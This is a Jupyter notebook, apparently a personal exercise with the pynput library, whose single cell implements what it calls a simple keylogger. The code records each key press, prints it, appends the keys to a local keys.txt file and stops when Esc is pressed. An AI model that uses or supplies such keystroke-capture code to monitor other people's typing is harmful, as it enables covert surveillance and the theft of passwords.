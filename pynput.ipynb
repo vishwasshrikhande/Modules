{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.8.6 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "cc16ac041c0d4079ef4b47dc01379ffa67e67cf2c52ba49571836f7df9b56e66"
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Key.tab\n",
      "Key.tabKey.alt_l\n",
      "Key.space\n",
      "Key.spaceKey.backspace\n",
      "Key.backspace\n",
      "Key.backspaceKey.down\n",
      "b\n",
      "bKey.backspace\n",
      "bKey.backspaceKey.esc\n"
     ]
    }
   ],
   "source": [
    "#following a simple keylogger\n",
    "from pynput.keyboard import Key, Controller,Listener\n",
    "import time\n",
    "keyboard = Controller()\n",
    "keys=[]\n",
    "def on_press(key):\n",
    "    global keys\n",
    "    string = str(key).replace(\"'\",\"\")\n",
    "    keys.append(string)\n",
    "    main_string = \"\".join(keys)\n",
    "    print(main_string)\n",
    "    if len(main_string)>15:\n",
    "      with open('keys.txt', 'a') as f:\n",
    "          f.write(main_string)   \n",
    "          keys= []     \n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press,on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  }
 ]
}